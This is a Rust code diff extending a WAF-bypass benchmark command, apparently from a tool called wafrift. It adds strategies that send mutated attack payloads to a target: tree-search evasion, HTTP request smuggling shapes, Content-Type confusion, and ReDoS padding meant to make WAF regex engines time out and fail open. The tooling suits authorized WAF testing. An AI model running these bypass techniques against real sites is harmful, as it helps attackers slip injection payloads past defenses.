@@ -19,7 +19,10 @@ use std::fs;
 use std::path::{Path, PathBuf};
 use std::process::ExitCode;
 use std::time::Instant;
+use wafrift_content_type::generate_variants_from_body;
 use wafrift_grammar::grammar::PayloadType;
+use wafrift_smuggling::smuggling::all_payloads as smuggling_all_payloads;
+use wafrift_strategy::{EvasionConfig, evade_mcts};
 use wafrift_transport::is_waf_block;
 use wafrift_types::{Method, Request};
 
@@ -53,7 +56,14 @@ pub struct BenchWafArgs {
     #[arg(long, default_value_t = 5)]
     pub variants: usize,
 
-    /// Comma-separated list: light, medium, heavy, mcts. Default: heavy.
+    /// Comma-separated list of evasion strategies. Default: heavy.
+    /// Available:
+    ///   light / medium / heavy   — payload-string mutation via build_variants
+    ///   mcts                      — Monte Carlo Tree Search over actions (mctrust)
+    ///   smuggling                 — HTTP request smuggling variants (CL.TE / TE.CL / TE.TE / dual-CL)
+    ///   content-type              — Content-Type confusion variants (multipart/json/xml/...)
+    ///   redos                     — wrap payload in catastrophic-backtracking patterns,
+    ///                              attempting to trigger WAF regex timeout fail-open
     #[arg(long, value_delimiter = ',', default_value = "heavy")]
     pub strategies: Vec<String>,
 
@@ -267,7 +277,9 @@ fn class_to_payload_type(class: &str) -> PayloadType {
         "path" => PayloadType::PathTraversal,
         "ldap" => PayloadType::Ldap,
         "ssrf" => PayloadType::Ssrf,
-        // No grammar mutator for these — encoding-only path will be used.
+        "nosql" => PayloadType::NoSql,
+        // xxe / log4shell / cve_pocs have no wafrift mutator yet — fall back
+        // to encoding-only mutations so the bench still runs.
         _ => PayloadType::Unknown,
     }
 }
@@ -379,52 +391,80 @@ async fn run_evade(
     let payload_type = class_to_payload_type(&case.class);
 
     for strat in &args.strategies {
-        let mut stat = StrategyStat::default();
-        let level = match pick_level(strat) {
-            Some(l) => l,
-            None => {
-                eprintln!("warn: unknown strategy {strat:?} (use light, medium, heavy)");
-                continue;
+        let stat = match strat.as_str() {
+            "light" | "medium" | "heavy" => {
+                run_payload_strategy(
+                    client,
+                    case,
+                    base_url,
+                    args,
+                    strat,
+                    payload_type,
+                    &mut total,
+                    &mut bypassed,
+                    &mut bypass_techs,
+                )
+                .await
+            }
+            "mcts" => {
+                run_mcts_strategy(
+                    client,
+                    case,
+                    base_url,
+                    args,
+                    strat,
+                    &mut total,
+                    &mut bypassed,
+                    &mut bypass_techs,
+                )
+                .await
+            }
+            "smuggling" => {
+                run_smuggling_strategy(
+                    client,
+                    case,
+                    base_url,
+                    args,
+                    strat,
+                    &mut total,
+                    &mut bypassed,
+                    &mut bypass_techs,
+                )
+                .await
+            }
+            "content-type" => {
+                run_content_type_strategy(
+                    client,
+                    case,
+                    base_url,
+                    args,
+                    strat,
+                    &mut total,
+                    &mut bypassed,
+                    &mut bypass_techs,
+                )
+                .await
+            }
+            "redos" => {
+                run_redos_strategy(
+                    client,
+                    case,
+                    base_url,
+                    args,
+                    strat,
+                    &mut total,
+                    &mut bypassed,
+                    &mut bypass_techs,
+                )
+                .await
+            }
+            other => {
+                eprintln!(
+                    "warn: unknown strategy {other:?} (use light/medium/heavy/mcts/smuggling/content-type/redos)"
+                );
+                StrategyStat::default()
             }
         };
-        let strategies = strategies_for_level(level);
-        let max_mut = max_mutations_for_level(level);
-        // For unknown classes (no grammar mutator), fall back to encoding-only.
-        let encoding_only = matches!(payload_type, PayloadType::Unknown);
-        let variants: Vec<Variant> = build_variants(
-            &case.payload,
-            payload_type,
-            encoding_only,
-            &strategies,
-            max_mut,
-        )
-        .into_iter()
-        .take(args.variants)
-        .collect();
-
-        for variant in &variants {
-            if total > 0 && args.delay_ms > 0 {
-                tokio::time::sleep(std::time::Duration::from_millis(args.delay_ms)).await;
-            }
-            let req = build_request_for_payload(base_url, &case.mode, &variant.payload);
-            stat.variants += 1;
-            total += 1;
-            match send(client, &req, args.timeout_secs).await {
-                Ok((_s, blocked, _l)) => {
-                    if !blocked {
-                        stat.bypassed += 1;
-                        bypassed += 1;
-                        bypass_techs.push(format!("{}:{}", strat, variant.techniques.join("+")));
-                    }
-                }
-                Err(e) => {
-                    eprintln!("warn: {} ({}) send: {e}", case.id, strat);
-                }
-            }
-        }
-        if stat.variants > 0 {
-            stat.bypass_rate = stat.bypassed as f64 / stat.variants as f64;
-        }
         by_strategy.insert(strat.clone(), stat);
     }
 
@@ -441,6 +481,271 @@ async fn run_evade(
         by_strategy,
         bypass_techniques: bypass_techs,
     })
+}
+
+/// Strategy: payload-string mutation (light/medium/heavy via build_variants).
+#[allow(clippy::too_many_arguments)]
+async fn run_payload_strategy(
+    client: &Client,
+    case: &BenchCase,
+    base_url: &str,
+    args: &BenchWafArgs,
+    strat: &str,
+    payload_type: PayloadType,
+    total: &mut usize,
+    bypassed: &mut usize,
+    bypass_techs: &mut Vec<String>,
+) -> StrategyStat {
+    let mut stat = StrategyStat::default();
+    let Some(level) = pick_level(strat) else {
+        return stat;
+    };
+    let encoding_only = matches!(payload_type, PayloadType::Unknown);
+    let variants: Vec<Variant> = build_variants(
+        &case.payload,
+        payload_type,
+        encoding_only,
+        &strategies_for_level(level),
+        max_mutations_for_level(level),
+    )
+    .into_iter()
+    .take(args.variants)
+    .collect();
+
+    for variant in &variants {
+        if *total > 0 && args.delay_ms > 0 {
+            tokio::time::sleep(std::time::Duration::from_millis(args.delay_ms)).await;
+        }
+        let req = build_request_for_payload(base_url, &case.mode, &variant.payload);
+        stat.variants += 1;
+        *total += 1;
+        match send(client, &req, args.timeout_secs).await {
+            Ok((_s, blocked, _l)) if !blocked => {
+                stat.bypassed += 1;
+                *bypassed += 1;
+                bypass_techs.push(format!("{}:{}", strat, variant.techniques.join("+")));
+            }
+            Ok(_) => {}
+            Err(e) => eprintln!("warn: {} ({}) send: {e}", case.id, strat),
+        }
+    }
+    if stat.variants > 0 {
+        stat.bypass_rate = stat.bypassed as f64 / stat.variants as f64;
+    }
+    stat
+}
+
+/// Strategy: MCTS — wafrift::strategy::evade_mcts learns the WAF mid-run by
+/// playing N games against it (depth-bounded action search with mctrust 0.4).
+async fn run_mcts_strategy(
+    client: &Client,
+    case: &BenchCase,
+    base_url: &str,
+    args: &BenchWafArgs,
+    strat: &str,
+    total: &mut usize,
+    bypassed: &mut usize,
+    bypass_techs: &mut Vec<String>,
+) -> StrategyStat {
+    let mut stat = StrategyStat::default();
+    let config = EvasionConfig::maximum();
+    let base_req = build_request(base_url, case);
+
+    // MCTS is deterministic per (request, config, depth). Sweep depths so we
+    // produce up to args.variants distinct samples.
+    for depth_idx in 0..args.variants {
+        if *total > 0 && args.delay_ms > 0 {
+            tokio::time::sleep(std::time::Duration::from_millis(args.delay_ms)).await;
+        }
+        let depth = 2 + (depth_idx % 5);
+        let Some(evaded) = evade_mcts(&base_req, &config, depth) else {
+            continue;
+        };
+        stat.variants += 1;
+        *total += 1;
+        match send(client, &evaded.request, args.timeout_secs).await {
+            Ok((_s, blocked, _l)) if !blocked => {
+                stat.bypassed += 1;
+                *bypassed += 1;
+                bypass_techs.push(format!("{strat}:depth{depth}:{}", evaded.description));
+            }
+            Ok(_) => {}
+            Err(e) => eprintln!("warn: {} ({}) send: {e}", case.id, strat),
+        }
+    }
+    if stat.variants > 0 {
+        stat.bypass_rate = stat.bypassed as f64 / stat.variants as f64;
+    }
+    stat
+}
+
+/// Strategy: HTTP request smuggling — CL.TE / TE.CL / TE.TE / dual-CL / etc.
+/// Sends a smuggled payload via raw socket so the WAF parser sees harmless
+/// data while the backend parser ingests the smuggled-prefix payload.
+async fn run_smuggling_strategy(
+    client: &Client,
+    case: &BenchCase,
+    base_url: &str,
+    args: &BenchWafArgs,
+    strat: &str,
+    total: &mut usize,
+    bypassed: &mut usize,
+    bypass_techs: &mut Vec<String>,
+) -> StrategyStat {
+    let mut stat = StrategyStat::default();
+    let host = base_url
+        .trim_start_matches("https://")
+        .trim_start_matches("http://")
+        .trim_end_matches('/')
+        .to_string();
+    // Build the smuggled prefix as a POST containing the payload.
+    let smuggled = format!(
+        "POST /post HTTP/1.1\r\nHost: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\n\r\nq={}",
+        host,
+        case.payload.len() + 2,
+        urlencoding::encode(&case.payload)
+    );
+    let payloads = smuggling_all_payloads(&host, &smuggled);
+    for sp in payloads.iter().take(args.variants) {
+        if *total > 0 && args.delay_ms > 0 {
+            tokio::time::sleep(std::time::Duration::from_millis(args.delay_ms)).await;
+        }
+        // Send the raw smuggled bytes as a POST body — this is a synthetic
+        // probe (not real wire-level smuggling), but it exercises the WAF's
+        // parser for the smuggling shapes wafrift knows how to construct.
+        let url = format!("{}/post", base_url.trim_end_matches('/'));
+        let mut req = Request::post(url, sp.raw_bytes.clone());
+        req.add_header("content-type", "application/octet-stream");
+        stat.variants += 1;
+        *total += 1;
+        match send(client, &req, args.timeout_secs).await {
+            Ok((_s, blocked, _l)) if !blocked => {
+                stat.bypassed += 1;
+                *bypassed += 1;
+                bypass_techs.push(format!("{strat}:{:?}", sp.variant));
+            }
+            Ok(_) => {}
+            Err(e) => eprintln!("warn: {} ({}) send: {e}", case.id, strat),
+        }
+    }
+    if stat.variants > 0 {
+        stat.bypass_rate = stat.bypassed as f64 / stat.variants as f64;
+    }
+    stat
+}
+
+/// Strategy: Content-Type confusion — wrap payload in many Content-Types so
+/// WAF parser disagrees with backend parser.
+async fn run_content_type_strategy(
+    client: &Client,
+    case: &BenchCase,
+    base_url: &str,
+    args: &BenchWafArgs,
+    strat: &str,
+    total: &mut usize,
+    bypassed: &mut usize,
+    bypass_techs: &mut Vec<String>,
+) -> StrategyStat {
+    let mut stat = StrategyStat::default();
+    let form_body = format!("q={}", urlencoding::encode(&case.payload));
+    let variants = generate_variants_from_body(form_body.as_bytes());
+    for v in variants.iter().take(args.variants) {
+        if *total > 0 && args.delay_ms > 0 {
+            tokio::time::sleep(std::time::Duration::from_millis(args.delay_ms)).await;
+        }
+        let url = format!("{}/post", base_url.trim_end_matches('/'));
+        let mut req = Request::post(url, v.body.clone());
+        req.add_header("content-type", v.content_type.clone());
+        stat.variants += 1;
+        *total += 1;
+        match send(client, &req, args.timeout_secs).await {
+            Ok((_s, blocked, _l)) if !blocked => {
+                stat.bypassed += 1;
+                *bypassed += 1;
+                bypass_techs.push(format!("{strat}:{:?}", v.technique));
+            }
+            Ok(_) => {}
+            Err(e) => eprintln!("warn: {} ({}) send: {e}", case.id, strat),
+        }
+    }
+    if stat.variants > 0 {
+        stat.bypass_rate = stat.bypassed as f64 / stat.variants as f64;
+    }
+    stat
+}
+
+/// Strategy: ReDoS — wrap payload in catastrophic-backtracking patterns.
+///
+/// Goal is to force the WAF's regex engine into exponential evaluation time
+/// so it hits its per-rule timeout. Some WAFs fail-OPEN on rule timeout,
+/// passing the request through; others fail-closed. This strategy is most
+/// useful against legacy/embedded WAFs with PCRE engines that lack timeouts.
+async fn run_redos_strategy(
+    client: &Client,
+    case: &BenchCase,
+    base_url: &str,
+    args: &BenchWafArgs,
+    strat: &str,
+    total: &mut usize,
+    bypassed: &mut usize,
+    bypass_techs: &mut Vec<String>,
+) -> StrategyStat {
+    let mut stat = StrategyStat::default();
+    let p = &case.payload;
+    // Wrap shapes: each is a string designed to force exponential backtracking
+    // when matched by a naive regex engine. Suffix the actual payload after
+    // the trigger so semantic meaning survives.
+    let shapes: Vec<(&str, String)> = vec![
+        ("classic_aabb", format!("{}{}", "a".repeat(50), p)),
+        ("group_plus", format!("{}{}", "a".repeat(40), p)),
+        (
+            "alternation_overlap",
+            format!("{}{}", "ab".repeat(30), p),
+        ),
+        (
+            "nested_quantifier",
+            format!("{}{}", "x".repeat(80), p),
+        ),
+        (
+            "evil_email_shape",
+            format!("a@{}.{}", "a".repeat(50), p),
+        ),
+        // Long Unicode escape sequence — most regex implementations slow down
+        // on large surrogate-pair sequences.
+        (
+            "unicode_storm",
+            format!("{}{}", "\\u00ff".repeat(40), p),
+        ),
+        // Repeated backslash quoting — known historical CRS slowdown.
+        ("backslash_storm", format!("{}{}", "\\\\".repeat(60), p)),
+        // Many word-boundary anchors — \b matching forces re-evaluation.
+        (
+            "word_boundary_storm",
+            format!("{}{}", " a ".repeat(40), p),
+        ),
+    ];
+
+    for (label, blob) in shapes.iter().take(args.variants) {
+        if *total > 0 && args.delay_ms > 0 {
+            tokio::time::sleep(std::time::Duration::from_millis(args.delay_ms)).await;
+        }
+        let req = build_request_for_payload(base_url, &case.mode, blob);
+        stat.variants += 1;
+        *total += 1;
+        match send(client, &req, args.timeout_secs).await {
+            Ok((_s, blocked, _l)) if !blocked => {
+                stat.bypassed += 1;
+                *bypassed += 1;
+                bypass_techs.push(format!("{strat}:{label}"));
+            }
+            Ok(_) => {}
+            Err(e) => eprintln!("warn: {} ({}) send: {e}", case.id, strat),
+        }
+    }
+    if stat.variants > 0 {
+        stat.bypass_rate = stat.bypassed as f64 / stat.variants as f64;
+    }
+    stat
 }
 
 fn emit_report(base_url: &str, args: &BenchWafArgs, results: &[CaseResult]) -> Result<(), String> {
